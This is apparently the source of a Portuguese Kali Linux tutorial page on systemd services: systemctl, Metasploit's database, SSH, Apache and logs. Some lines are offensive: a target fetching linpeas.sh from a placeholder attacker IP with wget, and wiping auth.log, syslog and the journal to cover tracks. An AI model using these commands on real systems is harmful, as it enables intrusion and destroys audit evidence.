import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";

export default function Servicos() {
  return (
    <PageContainer
      title="Serviços com systemd"
      subtitle="Inicie, pare e gerencie serviços do Kali Linux com systemctl."
      difficulty="iniciante"
      timeToRead="6 min"
    >
      <h2>systemctl — gerenciador de serviços</h2>
      <CodeBlock language="bash" code={`# Status de um serviço
sudo systemctl status ssh
sudo systemctl status apache2
sudo systemctl status postgresql

# Iniciar / parar / reiniciar
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh
sudo systemctl reload nginx    # recarregar config sem parar

# Habilitar / desabilitar (iniciar com o sistema)
sudo systemctl enable ssh
sudo systemctl disable ssh
sudo systemctl enable --now ssh   # habilita E inicia agora

# Listar serviços
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl list-units --state=failed`} />

      <h2>Serviços essenciais no Kali</h2>
      <div className="space-y-3 my-6">
        {[
          { svc: "ssh", desc: "Secure Shell — acesso remoto ao Kali", uso: "Controle remoto, pivoting" },
          { svc: "apache2", desc: "Servidor web Apache", uso: "Hospedar payloads, phishing" },
          { svc: "postgresql", desc: "Banco de dados — usado pelo Metasploit", uso: "Necessário para msfdb" },
          { svc: "networking", desc: "Serviço de rede do sistema", uso: "Conectividade" },
          { svc: "mysql", desc: "Banco de dados MariaDB/MySQL", uso: "Testes de SQLi local" },
          { svc: "docker", desc: "Containers Docker", uso: "Rodar ferramentas isoladas" },
        ].map((s, i) => (
          <div key={i} className="flex items-start gap-4 bg-card border border-border rounded-lg px-4 py-3 text-sm">
            <code className="min-w-[110px] text-primary font-mono text-xs pt-0.5">{s.svc}</code>
            <div>
              <div className="text-foreground">{s.desc}</div>
              <div className="text-xs text-muted-foreground mt-0.5">Uso: {s.uso}</div>
            </div>
          </div>
        ))}
      </div>

      <h2>Metasploit e PostgreSQL</h2>
      <CodeBlock language="bash" code={`# O Metasploit usa PostgreSQL para salvar dados
# Inicializar o banco de dados
sudo msfdb init

# Iniciar banco e Metasploit
sudo msfdb start
msfconsole

# Dentro do msfconsole, verificar conexão
db_status

# Parar o banco
sudo msfdb stop

# Reinicializar (apaga tudo!)
sudo msfdb reinit`} />

      <h2>SSH — configurando para uso</h2>
      <CodeBlock language="bash" code={`# Iniciar SSH (desligado por padrão no Kali!)
sudo systemctl start ssh
sudo systemctl enable ssh

# Configurar SSH
sudo nano /etc/ssh/sshd_config

# Configurações importantes:
# Port 22                    # ou outra porta
# PermitRootLogin yes        # permite login como root
# PasswordAuthentication yes # permite senha (ou no para só chave)
# PubkeyAuthentication yes   # permite chave pública

# Reiniciar após editar
sudo systemctl restart ssh

# Ver logs de SSH (tentativas de login)
sudo tail -f /var/log/auth.log | grep ssh`} />

      <h2>Apache — servidor web local</h2>
      <CodeBlock language="bash" code={`# Iniciar Apache
sudo systemctl start apache2

# Diretório web padrão
ls /var/www/html/

# Hospedar arquivo para download (pentest)
cp linpeas.sh /var/www/html/
sudo systemctl start apache2
# Alvo faz: wget http://SEU_IP/linpeas.sh

# Servidor Python simples (alternativa rápida)
python3 -m http.server 80       # porta 80
python3 -m http.server 8080     # porta 8080
python3 -m http.server 443 --bind 0.0.0.0

# Verificar o que está rodando nas portas
ss -tulpn | grep :80
ss -tulpn | grep :443`} />

      <h2>Logs do sistema</h2>
      <CodeBlock language="bash" code={`# Logs com journalctl
journalctl -xe                          # últimas entradas com erros
journalctl -u ssh                       # logs do SSH
journalctl -u apache2 -f                # logs Apache em tempo real
journalctl --since "1 hour ago"         # último 1 hora
journalctl -p err                       # apenas erros

# Logs clássicos
tail -f /var/log/syslog
tail -f /var/log/auth.log
tail -f /var/log/kern.log

# Limpar logs (cobrir rastros — em ambiente de teste)
> /var/log/auth.log
> /var/log/syslog
journalctl --rotate && journalctl --vacuum-time=1s`} />

      <AlertBox type="info" title="Serviços OFF por padrão">
        O Kali não inicia serviços automaticamente por questões de segurança e discreção. 
        Sempre inicie apenas o que precisa e desligue depois. 
        Use <code>sudo systemctl --state=active</code> para ver o que está rodando.
      </AlertBox>
    </PageContainer>
  );
}
